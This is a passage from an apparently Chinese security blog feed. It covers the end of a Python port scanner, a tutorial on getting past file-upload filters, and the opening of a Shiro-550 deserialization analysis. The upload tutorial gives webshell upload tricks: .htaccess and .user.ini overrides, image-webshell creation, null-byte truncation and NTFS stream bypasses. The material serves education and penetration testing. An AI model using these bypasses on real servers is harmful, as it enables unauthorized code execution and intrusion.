扫描：如果返回 True，说明端口开放；如果返回 False，说明关闭。</span><br><span class="hljs-string">      2. 如果 SYN 扫描无响应（返回 None），则尝试 TCP 全连接扫描确认。</span><br><span class="hljs-string">      3. 如果 TCP 全连接扫描仍然无响应，再用 FIN 扫描进一步确认。</span><br><span class="hljs-string">      4. 根据所有方法的结果给出最终结论。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    status_details = &#123;&#125;<br>    <br>    <span class="hljs-comment"># 尝试 SYN 扫描</span><br>    syn_result = syn_scan(target, port, timeout)<br>    status_details[<span class="hljs-string">&#x27;syn&#x27;</span>] = syn_result<br><br>    <span class="hljs-keyword">if</span> syn_result <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>        final_status = <span class="hljs-string">&quot;open&quot;</span><br>    <span class="hljs-keyword">elif</span> syn_result <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>        final_status = <span class="hljs-string">&quot;closed&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># SYN 无响应，尝试 TCP 全连接扫描</span><br>        connect_result = tcp_connect_scan(target, port, timeout)<br>        status_details[<span class="hljs-string">&#x27;connect&#x27;</span>] = connect_result<br>        <span class="hljs-keyword">if</span> connect_result:<br>            final_status = <span class="hljs-string">&quot;open&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 如果 TCP 全连接扫描也无响应，再尝试 FIN 扫描</span><br>            fin_result = fin_scan(target, port, timeout)<br>            status_details[<span class="hljs-string">&#x27;fin&#x27;</span>] = fin_result<br>            <span class="hljs-keyword">if</span> fin_result <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>                final_status = <span class="hljs-string">&quot;closed&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                final_status = <span class="hljs-string">&quot;open/filtered&quot;</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[Combined] 端口 <span class="hljs-subst">&#123;port&#125;</span> 最终状态: <span class="hljs-subst">&#123;final_status&#125;</span> | 细节: <span class="hljs-subst">&#123;status_details&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> final_status<br><br><span class="hljs-comment"># 主程序：支持命令行参数，扫描指定端口范围</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;综合多种扫描方法的端口探测器&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;target&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;目标IP地址或域名&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--ports&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;扫描端口范围，如 20-80，默认为 20-80&quot;</span>, default=<span class="hljs-string">&quot;20-80&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--timeout&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;超时时间（秒），默认为 1&quot;</span>, default=<span class="hljs-number">1</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-comment"># 解析端口范围</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> args.ports:<br>        start_port, end_port = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, args.ports.split(<span class="hljs-string">&quot;-&quot;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        start_port = end_port = <span class="hljs-built_in">int</span>(args.ports)<br><br>    target = args.target<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;开始扫描 <span class="hljs-subst">&#123;target&#125;</span> 端口 <span class="hljs-subst">&#123;start_port&#125;</span> 到 <span class="hljs-subst">&#123;end_port&#125;</span>，使用综合扫描方法&quot;</span>)<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start_port, end_port + <span class="hljs-number">1</span>):<br>        combined_scan(target, port, timeout=args.timeout)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
      <tag>端口探测</tag>
      
      <tag>主机探测</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web漏洞之文件上传</title>
    <link href="/2025/02/05/web%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/02/05/web%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><p><strong>文件上传漏洞</strong>是指网站或应用程序允许用户上传文件（如图片、文档等）时，未对上传的文件进行充分的安全验证和限制，导致攻击者可以上传而已文件并执行危险操作。</p><blockquote><p>这种攻击时最为直接有效的，“文件上传”本身没有问题，问题在于上传的文件在服务端中如何处理、解释文件，如果服务端处理文件的逻辑不够安全，则会导致严重的后果。</p></blockquote><h1 id="二、脚本解析拓展名"><a href="#二、脚本解析拓展名" class="headerlink" title="二、脚本解析拓展名"></a>二、脚本解析拓展名</h1><p>以下的解析拓展名不是在所有情况下均能够解析，部分拓展名需要在开启特定的配置的情况下才能够正确解析</p><ol><li>PHP 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">.php|.php2|.php3|.php4|.php5|.php6|.php7|.phps|.pht|<br>.phtm|.phtml|.pgif|.shtml|.htaccess|.phar|.inc|.hphp|.module<br></code></pre></td></tr></table></figure><ol start="2"><li>PHP8 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.php|.php4|.php5|.phtml|.module|.inc|.hphp<br></code></pre></td></tr></table></figure><ol start="3"><li>ASP 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.asp|.aspx|.config|.ashx|.aspq|.axd|.cshtm|.cshtml|.rem|.soap|.vbhtml|.asa|.cer|.shtml<br></code></pre></td></tr></table></figure><ol start="4"><li>JSP 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.jsp|.jspx|.jsw|.jsv|.jspf|.wss|.do|.action<br></code></pre></td></tr></table></figure><ol start="5"><li>Coldfusion 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.cfm|.cfml|.cfc|.dbm<br></code></pre></td></tr></table></figure><ol start="6"><li>Flash 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.swf<br></code></pre></td></tr></table></figure><ol start="7"><li>Perl 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.pl|.cgi<br></code></pre></td></tr></table></figure><ol start="8"><li>Erlang Yaws Web Server 脚本解析拓展名</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.yaws<br></code></pre></td></tr></table></figure><h1 id="三、基本分类"><a href="#三、基本分类" class="headerlink" title="三、基本分类"></a>三、基本分类</h1><p><strong>文件上传漏洞</strong>的目的就是想方设法让服务端解析上传的文件。在上传文件的过程中可能会遇到诸多阻碍，包括但不限于限制文件上传类型或者限制上传的文件内容等等，为了能够顺利上传文件需要绕过相应的限制，具体的限制类型分为以下两类：</p><h2 id="3-1-客户端过滤"><a href="#3-1-客户端过滤" class="headerlink" title="3.1 客户端过滤"></a>3.1 客户端过滤</h2><p><strong>客户端过滤</strong>也称为<strong>前端过滤</strong>，通过 JavaScript 前端代码对上传的文件做一些基本的判断，但是这种过滤方式本质上就是不安全的，只能作为一些辅助手段，不能替代后端的安全验证；</p><p>通过以下的方法能够基本判断网页的文件上传是否为前端过滤：</p><ol><li><strong>验证速度</strong>：验证响应速度快，且网页似乎没有产生停顿或跳转时；</li><li><strong>网页源码是否存在相关判定：</strong>查看网页源代码是否存在对上传文件判断的相关 js 代码；</li><li><strong>Burpsuite 抓包验证</strong>：在产生验证结果前，是否存在向服务端发送文件相关的数据包；</li></ol><h2 id="3-2-服务端过滤"><a href="#3-2-服务端过滤" class="headerlink" title="3.2 服务端过滤"></a>3.2 服务端过滤</h2><p><strong>服务端过滤</strong>也称为<strong>后端过滤</strong>，通过服务器端对上传文件的处理逻辑进行过滤，包括但不限于后缀名过滤、文件内容过滤、文件内容大小过滤等等；这也是文件上传过滤的主要方式，但是如果存在不安全的处理逻辑，也会导致文件上传漏洞；</p><p>可以通过判断是否为客户端过滤来判断是否为服务端过滤，若文件上传点不为前端过滤，则为后端过滤；</p><p>若前端存在过滤，则可以通过绕过前端过滤后，再进一步判断是否存在后端过滤；</p><h1 id="四、过滤绕过方法"><a href="#四、过滤绕过方法" class="headerlink" title="四、过滤绕过方法"></a>四、过滤绕过方法</h1><h2 id="4-1-客户端过滤"><a href="#4-1-客户端过滤" class="headerlink" title="4.1 客户端过滤"></a>4.1 客户端过滤</h2><h3 id="4-1-1-抓包重放"><a href="#4-1-1-抓包重放" class="headerlink" title="4.1.1 抓包重放"></a>4.1.1 抓包重放</h3><ol><li>首先构造一个满足前端条件的文件上传，抓取上传文件的数据包；</li><li>修改数据包中文件的名称、内容、类型等数据再重放；</li></ol><p>上述方法是普遍使用绕过客户端过滤的方式，通过修改数据包重放绕过前端过滤；</p><h3 id="4-1-2-js-禁用"><a href="#4-1-2-js-禁用" class="headerlink" title="4.1.2 js 禁用"></a>4.1.2 js 禁用</h3><p>通过禁用 js ，使 js 代码不能执行，从而绕过前端过滤，由于需要对浏览器进行设置，所以一般不适用该方法，并且使用该方式某些情况下无法绕过；</p><h2 id="4-2-服务端过滤"><a href="#4-2-服务端过滤" class="headerlink" title="4.2 服务端过滤"></a>4.2 服务端过滤</h2><h3 id="4-2-1-文件后缀名大小写绕过"><a href="#4-2-1-文件后缀名大小写绕过" class="headerlink" title="4.2.1 文件后缀名大小写绕过"></a>4.2.1 文件后缀名大小写绕过</h3><p>在黑名单过滤的情况下，服务端可能仅对小写字母的后缀名进行过滤，没有考虑大写字母后缀的情况；或者近考虑了大写字母和小写字母的情况，没有考虑大小写字母共存的情况；因此可以通过大小写文件后缀名绕过后缀名过滤。eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.Php|.pHp|.PHp|.pHp5|.pHaR|.pHtMl<br></code></pre></td></tr></table></figure><h3 id="4-2-2-特殊文件后缀名绕过"><a href="#4-2-2-特殊文件后缀名绕过" class="headerlink" title="4.2.2 特殊文件后缀名绕过"></a>4.2.2 特殊文件后缀名绕过</h3><p>在服务端过滤的文件后缀名中仅存在一些常见的脚本解析后缀名时，可以通过使用一些特殊的脚本解析后缀名进行绕过。</p><p>在某些httpd.conf中，默认对于文件的解析规则可能如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;FilesMatch &quot;+\.ph(p[3457]?|t|tml)$&quot;&gt;<br>    SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>由于黑名单规则不严谨，可以通过如下扩展名绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml<br></code></pre></td></tr></table></figure><h3 id="4-2-3-htaccess-绕过"><a href="#4-2-3-htaccess-绕过" class="headerlink" title="4.2.3 .htaccess 绕过"></a>4.2.3 .htaccess 绕过</h3><p>在apache中，该文件作为一个配置文件，可以用来控制所在目录的<strong>访问权限</strong>以及<strong>解析设置</strong>。</p><p>若服务端没有限制<code>.htaccess</code>文件的上传，那么上传一个<code>.htaccess</code>文件，就可以改变当前目录及其子目录的 apache 配置信息，将其他后缀的文件当作 php 文件解析。</p><p><strong>限制条件</strong>：服务器主配置文件将<code>AllowOverride</code>设置为<code>All</code></p><p>在<code>.htaccess</code>文件中重新编写解析规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;FilesMatch &quot;info.gif&quot;&gt;<br>    SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x_httpd_php jpg <span class="hljs-comment"># 匹配所有的jpg后缀文件</span><br></code></pre></td></tr></table></figure><p>在当前目录及其子目录下，如果匹配到<code>info.gif</code>文件，则会被解析成 php 代码执行。上传<code>.htaccess</code>文件覆盖后，上传带有木马的图片以脚本形式解析导致木马执行；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> &gt; info.gif<br></code></pre></td></tr></table></figure><h3 id="4-2-4-user-ini-绕过"><a href="#4-2-4-user-ini-绕过" class="headerlink" title="4.2.4 .user.ini 绕过"></a>4.2.4 .user.ini 绕过</h3><p><code>.user.ini</code>文件是php的一个特性，允许位特定的php文件或目录设置特定的ini配置，而无需更改全局的<code>php.ini</code>文件。（.user.ini实际上就是一个可以由用户自定义的php.ini）</p><p><strong>限制条件：</strong>只有在<code>php&gt;=5.3.0</code>版本中</p><ul><li><strong>Apache 模块模式：</strong><code>.user.ini</code> 文件默认可以生效</li><li><strong>FastCGI 模式（如 PHP-FPM）</strong>:PHP-FPM 配置中未禁用用户级 INI 文件（默认启用）；PHP-FPM 子进程有权限读取 <code>.user.ini</code> 文件。</li></ul><p><code>.user.ini</code>比<code>.htaccess</code>用的更广泛，不管是 Nginx、Apache、IIS 只要是符合配置运行的 php 就可以。</p><p>在 Apache 中<code>.user.ini</code>和<code>.htaccess</code>有同样的效果，但<code>.htaccess</code>只可以用于 Apache。</p><p>在利用<code>.user.ini</code>绕过文件过滤主要是依赖于以下两个配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">auto_prepend_file=# 指定一个文件，在每个php脚本执行之前加载该文件(包含在文件头)<br>auto_append_file=# 指定一个文件，在每个php脚本执行之后加载该文件，若php最后exit()则不会加载(包含在文件尾)<br></code></pre></td></tr></table></figure><p>可以简单的理解成在文件前后添加了一条指令<code>include(&quot;xxxx&quot;);</code></p><p>可以通过上传一个<code>.user.ini</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">auto_prepend_file=info.gif<br></code></pre></td></tr></table></figure><p>此时，即可上传带有木马的一个文件，将其当作脚本解析即可实现脚本解析执行；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> &gt; info.gif<br></code></pre></td></tr></table></figure><blockquote><p>这里再提一嘴，有时我们发送的数据包的 url 请求路径会被记录到<code>/var/log/nginx/access.log</code>日志中</p><p>当服务端对上传文件内容存在极端过滤的情况下，可以通过请求脚本代码，使<code>/var/log/nginx/access.log</code>记录我们请求的脚本代码，再通过<code>.user.ini</code>包含<code>/var/log/nginx/access.log</code>文件，使其将<code>/var/log/nginx/access.log</code>文件当作脚本解析执行，从而执行请求的脚本代码。</p></blockquote><h3 id="4-2-5-文件内容绕过"><a href="#4-2-5-文件内容绕过" class="headerlink" title="4.2.5 文件内容绕过"></a>4.2.5 文件内容绕过</h3><ol><li><strong>文件头检测</strong></li></ol><p>在每一个文件（包括图片，视频或其他的非ASCII文件）的开头都有一片区域来显示这个文件的实际用法，这就是文件头标志。添加服务器允许的文件头以绕过检测。</p><p>基本上许多文件都有特定格式的文件头字节，可以将文件头加入到响应的地方。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">GIF: 47 49 46 38 39 61<br>PNG: 89 50 4E 47 0D 0A 1A 0A<br>JPG: FF D8 FF E0 00 10 4A 46 49 46<br></code></pre></td></tr></table></figure><p>只能上传图片格式的后缀，在进行文件头绕过时可以把上面的文件头添加到一句话木马内容最前面，达到绕过文件头检测的目的。</p><p>也可以通过在图片的元数据中引入脚本代码实现绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool -comment=<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> info.png<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>图片马绕过</strong></li></ol><ul><li><strong>绕过</strong><code>getimagesize</code><strong>函数</strong></li></ul><p>php一般使用 <code>getimagesize()</code> 函数检测文件头内容检测，getimagesize()函数会返回一个数组，其中下标2是图像的类型，其中<code>1=GIF|2=JPG|3=PNG</code>。上传一个正常图像后缀的图片马即可绕过。</p><ul><li><strong>绕过</strong><code>exif_imagetype</code><strong>函数</strong></li></ul><p><code>exif_imagetype()</code>函数会判断一个图像的类型。检查图像的第一个字节。可能返回的常量有<code>IMAGETYPE_GIF=1|IMAGETYPE_JPEG=2|MAGETYPE_PNG=3</code>文件头不正确返回false，上传具有正常文件头的图片马即可绕过。</p><p>图片马需要结合<strong>解析漏洞</strong>或者<strong>文件包含漏洞</strong>才能解析图片木马。</p><ul><li><strong>图片马的制作</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy gif1.gif/b+shell.php/a hackshell.gif<br>//表示gif1.php的二进制文件与shell.php的Ascii码文件合成一个新的hackshell.gif图片木马<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>二次渲染</strong></li></ol><p>在上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p><ul><li>判断方法</li></ul><p>对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。</p><ul><li>绕过方法</li></ul><p>文件包含漏洞：将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获webshell。</p><ul><li>条件竞争</li></ul><p>这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传。</p><h3 id="4-2-6-文件类型伪造（MIME）绕过"><a href="#4-2-6-文件类型伪造（MIME）绕过" class="headerlink" title="4.2.6 文件类型伪造（MIME）绕过"></a>4.2.6 文件类型伪造（MIME）绕过</h3><p>浏览器通常使用 MIME 类型（而不是文件拓展名）来确定如何处理 URL。大部分 Web 应用系统判定文件类型是通过<code>Content-Type</code>字段。</p><p>只需要将 MIME 类型修改为白名单中允许的类型即可，上传对文件类型做了白名单限制，可以根据白名单上传白名单中的文件类型；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">text/plain （纯文本）<br>text/html （HTML文档）<br>text/javascript （js代码）<br>application/xhtml+xml （XHTML文档）<br>image/gif （GIF图像）<br>image/jpeg （JPEG图像）<br>image/png （PNG图像）<br>video/mpeg （MPEG动画）<br>application/octet-stream （二进制数据）<br>application/pdf （PDF文档）<br></code></pre></td></tr></table></figure><h3 id="4-2-7-00-截断绕过"><a href="#4-2-7-00-截断绕过" class="headerlink" title="4.2.7 00 截断绕过"></a>4.2.7 00 截断绕过</h3><p><code>%00</code>是字符串的<strong>结束标识符</strong>，可以利用手动添加字符串结束标识符的方式来将后面的内容进行截断，而后面正常的扩展名又可以帮助我们绕过黑白名单检测。</p><p>注意：<code>0x00</code>和<code>%00</code>都表示字节值为零的字符，<code>%00</code>是<code>0x00</code>字节的URL编码形式。</p><p>当<strong>上传路径可控</strong>，<code>php.ini</code>中的<code>magic_quotes_gpc</code>为<code>off</code>时，可以使用00截断来绕过白名单：</p><p>如果上传文件的路径为：<code>可控的上传路径/随机数.白名单中的后缀</code></p><p>正常情况下，服务器拼接得到的上传路径为：<code>$img_path = ../upload/5920201223231032.gif;</code></p><p>而在可控的上传路径中，使用<code>%00</code>截断后，拼接得到的上传路径为：<code>$img_path = ../upload/eval.php%00/5920201223231032.gif</code></p><p>对后缀进行白名单检测时<code>.gif</code>可以很好绕过。但是保存在服务器上的文件却是<code>eval.php</code>，因为<code>%00</code>之后的内容被截断了。</p><h3 id="4-2-8-win-系统特性绕过"><a href="#4-2-8-win-系统特性绕过" class="headerlink" title="4.2.8 win 系统特性绕过"></a>4.2.8 win 系统特性绕过</h3><ul><li><strong>空格绕过</strong></li></ul><p>在Windows平台，在对用户上传的文件名进行处理时，没有使用<code>trim()</code>函数去除字符串首尾处的空白字符。</p><p>当用户上传图片马时，用Burp拦截在文件尾部加入空格。带有空格的后缀可以绕过黑名单的检测，但文件存在Windows服务器上时，会自动去除后缀中的空格。</p><ul><li><strong>点 dot 绕过</strong></li></ul><p>在Windows平台，在对用户上传的文件名进行处理时，没有使用<code>deldot()</code>函数删除文件名末尾的点。</p><p>上传文件名末尾的点的文件。在Windows服务器中，后缀名之后的点在保存时，会被自动忽略。</p><ul><li><strong>NTFS 文件流（::$DATA）绕过</strong></li></ul><p><code>::$DATA</code>流是Windows NTFS文件系统中的一个功能，它允许一个文件拥有多个数据流。创建一个数据交换流文件的方法：<code>宿主文件:准备与宿主文件关联的数据流文件</code>。</p><p>文件名为<code>文件名+::DATA</code>，则会把<code>::DATA</code>之后的数据当成文件流处理，并不会检测后缀名，且保持<code>::DATA</code>之前的文件名。</p><p>上传一个名为<code>eval.php::$DATA</code>的木马，可以绕过黑名单的检测，并且通过<code>eval.php</code>就可以访问。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.cnblogs.com/smileleooo/p/18162287">https://www.cnblogs.com/smileleooo/p/18162287</a></p>]]></content>
    
    
    <categories>
      
      <category>web基础漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550反序列化漏洞</title>
    <link href="/2024/12/12/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/12/12/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>使用官方的<code>shiro-shiro-root-1.2.4</code>，我是真的搭不出来，不是这错就是那儿错，崩溃！！！</p><p>还是直接下载p神的<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a>进行环境搭建吧……</p><p>打开项目添加tomcat配置，直接运行即可</p><h1 id="二、Shiro-550分析"><a href="#二、Shiro-550分析" class="headerlink" title="二、Shiro-550分析"></a>二、Shiro-550分析</h1><h2 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h2><p>勾选RememberMe字段，登录成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段。<br>之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282159881.png" alt="img"></p><p>Shiro1.2.4及之前的版本中，AES加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550）<br>Shiro1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低固定密码泄露的风险。</p><h2 id="2-2-漏洞角度分析Cookie"><a href="#2-2-漏洞角度分析Cookie" class="headerlink" title="2.2 漏洞角度分析Cookie"></a>2.2 漏洞角度分析Cookie</h2><p>从一个漏洞挖掘的角度出发，去看待这个Cooke</p><p>在抓包的情况下，拿到这个Cookie的时候，很明显能够看到这是经过某种加密的。<br>因为在平常的Cookie都是比较短的，而Shiro RememberMe字段的Cookie太长了。</p><p>至此，必须的先知道Cookie的加密过程，如何进行加密？是否可以人为构造Cookie？</p><p>在我们知晓Shiro加密过程之后，可以认为构造而已的Cookie参数，从而能够达到命令执行的目的。</p><h2 id="2-3-逆向分析解密过程"><a href="#2-3-逆向分析解密过程" class="headerlink" title="2.3 逆向分析解密过程"></a>2.3 逆向分析解密过程</h2><p>为了了解详细的Cookie解密过程，通过全局搜索Cookie或remember，主要是在Shiro包里找。</p><p>通过<code>Ctrl + Shift + n</code>全局搜索文件，在其中搜索<code>remember</code>能够看到一些文件；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282245453.png" alt="img"></p><p>在<code>AbstractRememberMeManager</code>类中，找到一个类似于<strong>硬编码</strong>的密钥；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282248896.png" alt="img"></p><p>最后找到相关的类<code>CookieRememberMeManager</code>，其中的<code>getRememberedSerializedIdentity()</code>方法似乎就是解密的其中一步；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412121500769.png" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409282255713.png" alt="img"></p><p>在该函数当中，首先判断是否为HTTP请求；如果是，则获取其中的Cookie；|<br>然后判断是否为deleteMe，不是则判断是否是base64的编码长度，不符合则对其填充等号，将base64解码的结果返回；</p><p>通过查看<code>getRememberedSerializedIdentity()</code>方法的用法，定位到<code>AbstractRememberMeManager#getRememberedPrincipals()</code>方法调用了<code>getRememberedSerializedIdentity()</code>方法。<br><code>getRememberedPrincipals()</code> 方法的返回类型为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291311107.png" alt="img"></p><p>在393行，将HTTP Requests里面的cookie提取出来，并经过base64解码后赋值给bytes数组；<br>在396行，将bytes数组进行<code>convertBytesToPrincipals()</code>转换，并将值赋值给pricipals变量。</p><p>继续F7跟进到<code>converBytesToPrincipals()</code>方法查看转换的细节<br><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409291319179.png" alt="img"></p><p>在该转换方法中明确的做了两件事情，一是解密bytes数组的信息内容；二是反序列化解密后的bytes数组信息；</p><h3 id="2-3-1-decrypt解密"><a href="#2-3-1-decrypt解密" class="headerlink" title="2.3.1 decrypt解密"></a>2.3.1 decrypt解密</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292036111.png" alt="img"></p><p>通过查看解密方法<code>decrypt()</code>源码；在487行，通过<code>getCipherServer()</code>方法获取加密服务，也就是实现AOP的实现类，在往后489行的<code>decrypt()</code>跟进去，可以知道是一个接口，参数有<code>byte[] encrypted, byte[] decryptionKey</code>。<br>其中第一个<code>encrypted</code>是加密内容数组，第二个<code>decryptionKey</code>是解密密钥，说明这是一个对称加密算法；后续需要重点关注一下这个<code>decryptionKey</code>的内容。</p><p>先简单分析一下<code>getCipherServer()</code>方法获取的加密服务，跟踪一下获取加密服务的获取流程</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409292355903.png" alt="img"></p><p>根据上图可知其实使用的加密服务就是AES对称加密，这也就可以直接我们后续使用的密钥<code>decryptionKey</code>如何作用了。</p><p>接下来，继续加密服务调用的<code>decrypt()</code>执行过程，首先分析传进行的参数；<br>形参<code>encrypted</code>数组是经过base64解密的Cookie，第二个参数是AES加密的对称密钥key，通过调用<code>getDecryptionCipherKey()</code>函数获得，查看函数的执行流程。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409300009135.png" alt="img"></p><figure class="highlight 